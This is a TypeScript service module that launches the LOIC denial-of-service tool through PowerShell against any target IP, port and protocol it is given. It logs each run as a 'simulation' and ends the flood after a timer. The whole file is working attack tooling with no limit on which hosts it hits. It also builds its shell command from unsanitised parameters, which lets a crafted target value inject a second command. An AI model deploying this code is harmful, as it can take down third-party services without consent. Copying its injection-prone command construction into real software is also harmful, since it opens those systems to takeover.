// services/ddosService.ts
import { spawn, ChildProcessWithoutNullStreams } from 'child_process';
import { insertEvent } from '../models/eventModel';

let loicProcess: ChildProcessWithoutNullStreams | null = null;

interface DDoSAttackParams {
    targetIP: string;
    port: number;
    method: 'TCP' | 'UDP' | 'HTTP';
    threads: number;
    duration: number; // in seconds
}

export async function startDDoSAttack(params: DDoSAttackParams): Promise<boolean> {
    try {
        if (loicProcess) {
            stopDDoSAttack();
        }

        // Create a record of this attack
        await insertEvent({
            type: 'ddos_simulation',
            source_ip: 'localhost',
            dest_ip: params.targetIP,
            severity: 'medium',
        });

        // call loic with the parameters
        loicProcess = spawn('powershell', [
            '-Command',
            `& 'c:/tools/LOIC/LOIC.exe' /target=${params.targetIP} /port=${params.port} /method=${params.method} /threads=${params.threads}`
        ], { shell: true });

        console.log(`Started DDoS simulation against ${params.targetIP}:${params.port}`);

        loicProcess.stdout?.on('data', (data: Buffer) => {
            console.log('LOIC output:', data.toString());
        });

        loicProcess.stderr?.on('data', (data: Buffer) => {
            console.error('LOIC error:', data.toString());
        });

        // Auto-terminate after specified duration
        setTimeout(() => {
            if (loicProcess) {
                stopDDoSAttack();
            }
        }, params.duration * 1000);

        return true;
    } catch (error) {
        console.error('Failed to start DDoS attack:', error);
        return false;
    }
}

export function stopDDoSAttack(): void {
    if (loicProcess) {
        loicProcess.kill();
        loicProcess = null;
        console.log('DDoS simulation stopped');
    }
}

export function getDDoSStatus(): { active: boolean; target?: string } {
    return {
        active: loicProcess !== null,
        target: loicProcess ? 'target' : undefined
    };
}